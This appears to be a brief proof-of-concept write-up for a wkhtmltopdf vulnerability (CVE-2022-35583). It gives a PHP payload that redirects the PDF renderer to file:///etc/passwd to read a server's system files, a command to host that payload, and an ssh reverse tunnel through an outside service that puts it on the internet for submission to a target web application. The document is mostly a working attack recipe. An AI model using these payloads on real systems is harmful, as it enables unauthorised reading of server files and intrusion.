# wkhtmltopdf 
 
Vulnerable to RCE
[CVE-2022-35583]('https://github.com/wkhtmltopdf/wkhtmltopdf/issues/5249')

1. SetUp Payload index.php

```php

<html>
<body>
<?php
	header('location:file:///etc/passwd');
?>
</body>
</html>

```

2. Start local DEV server in index.php directory

```curl 
php -S 0.0.0.0:1337
```

3. Setup remote ssh tunnel to local-server to make it accessable for the internet

```bash
ssh -R 80:192.168.178.66:1337 nokey@localhost.run
```

4. Request generated ssh url into web-application

